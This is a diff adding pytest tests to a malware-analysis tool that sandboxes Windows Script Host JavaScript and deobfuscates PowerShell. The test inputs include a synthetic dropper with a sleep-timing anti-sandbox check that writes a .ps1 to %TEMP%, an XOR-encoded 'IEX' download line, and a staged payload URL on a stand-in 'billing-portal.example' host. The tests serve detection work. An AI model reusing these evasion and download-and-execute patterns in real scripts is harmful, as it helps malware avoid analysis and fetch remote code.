@@ -225,3 +225,87 @@ def test_js_scripts_report_progress(tmp_path: Path) -> None:
     n = len(res["scripts"])
     assert n >= 2 and details[0] == f"script 0/{n}" and details[-1] == f"script {n}/{n}"
     assert [s["id"] for s in res["scripts"]] == sorted(s["id"] for s in res["scripts"])   # order kept
+
+
+def test_escape_block_detector_is_linear_on_cut_strings() -> None:
+    """A script cut at a size limit leaves a string literal open: the escape
+    block detector must not backtrack exponentially (it hung for 10+ min)."""
+    import time
+    code = 'var x = 1;\nvar blob = "' + "\\x41\\x42" * 60000          # never closed
+    t = time.perf_counter()
+    jt.static_techniques(code, 6)
+    assert time.perf_counter() - t < 5
+
+
+@pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")
+def test_wsh_emulation_self_read_drop_and_virtual_clock() -> None:
+    code = ('var t0 = new Date().getTime(); WScript.Sleep(5000);'
+            'if (new Date().getTime() - t0 < 4000) { WScript.Quit(); }'
+            'var fso = WScript.CreateObject("Scripting.FileSystemObject");'
+            'var me = fso.OpenTextFile(WScript.ScriptFullName, 1).ReadAll();'
+            'var p = WScript.CreateObject("WScript.Shell").ExpandEnvironmentStrings("%TEMP%") + "\\\\x.ps1";'
+            'var f = fso.CreateTextFile(p, true); f.Write(me.substring(me.lastIndexOf("//P:") + 4)); f.Close();'
+            '//P:Write-Host invoice')
+    sb = J.sandbox(code)
+    assert sb["error"] is None, sb["error"]
+    drops = [e for e in sb["log"] if e["kind"] == "drop"]
+    assert drops and drops[0]["name"].endswith("\\x.ps1") and "Temp" in drops[0]["name"]
+    assert drops[0]["args"][0] == "Write-Host invoice"          # read its own source
+    assert not any(e["name"] == "WScript.Quit" for e in sb["log"])  # passed the Sleep/clock check
+
+
+def test_ps_var_xor_hex_helper_and_leading_zeros() -> None:
+    from docutracex.parsers import ps_deobf
+    t = "IEX 'http://billing-portal.example/a'"
+    arr = ",".join(f"{ord(c) ^ 70:03d}" for c in t)
+    code = (f"$r1=@({arr})\n$rk1=070\n$rs1=-join($r1|ForEach-Object{{[char]([int]$_-bxor$rk1)}})\n"
+            "$h = { param($x) $o=New-Object Text.StringBuilder; $i=0; while($i-lt$x.Length){ "
+            "[void]$o.Append([char][Convert]::ToInt32($x.Substring($i,2),16)); $i+=2 } $o.ToString() }\n"
+            "$s = & $h '5363686564756C652E53657276696365'")
+    r = ps_deobf.deobfuscate(code)
+    assert {"xor-var-array", "hex-helper"} <= set(r["methods"])
+    assert "http://billing-portal.example/a" in r["code"] and "'Schedule.Service'" in r["code"]
+
+
+@pytest.mark.skipif(not _have_v8(), reason="STPyV8 not installed")
+def test_wsh_selfread_sample_end_to_end(client) -> None:
+    import json
+    _, res = _analyze(client, "sample_wsh_selfread.js", _ms().wsh_selfread_dropper_js())
+    js = json.loads((res / "javascript.json").read_text())
+    assert js["scripts"][0]["sandbox"]["error"] is None
+    assert {"js_sandbox_command", "js_antisandbox_timing"} <= {f["rule"] for f in js["findings"]}
+    ps1 = next(n for n in _tree(res) if n["filename"].endswith(".ps1"))
+    assert {"ps_download", "ps_iex"} <= {f["rule"] for f in ps1["findings"]}
+    iocs = {i["value"] for i in json.loads((res / "iocs.json").read_text())["iocs"]}
+    assert "http://billing-portal.example/inv/stage5.ps1" in iocs
+    assert not any("downloads\\invoice.js" in v.lower() for v in iocs)   # emulator artefact
+
+
+def test_rerun_does_not_reanalyse_own_outputs(client) -> None:
+    """extracted/code (dumps) and extracted/stages are the app's own output: a
+    re-run must not collect them back as new scripts of the sample."""
+    import json
+    cid, res = _analyze(client, "sample_obf_techniques.js", _ms().obf_techniques_js())
+    first = len(json.loads((res / "javascript.json").read_text())["scripts"])
+    tid = client.post(f"/api/cases/{cid}/rerun", json={"module": "full"}).json()["task"]["id"]
+    import time
+    for _ in range(1200):
+        t = next((x for x in client.get("/api/tasks").json()["tasks"] if x["id"] == tid), {})
+        if t.get("state") in ("completed", "failed"):
+            break
+        time.sleep(0.05)
+    assert len(json.loads((res / "javascript.json").read_text())["scripts"]) == first == 1
+
+
+def test_rerun_does_not_duplicate_decrypted_stages(client) -> None:
+    import json
+    import time
+    cid, res = _analyze(client, "sample_chain_dropper.js", _ms().chain_dropper_js())
+    before = [n["filename"] for n in _tree(res)]
+    tid = client.post(f"/api/cases/{cid}/rerun", json={"module": "full"}).json()["task"]["id"]
+    for _ in range(1200):
+        t = next((x for x in client.get("/api/tasks").json()["tasks"] if x["id"] == tid), {})
+        if t.get("state") in ("completed", "failed"):
+            break
+        time.sleep(0.05)
+    assert [n["filename"] for n in _tree(res)] == before and len(before) == len(set(before))
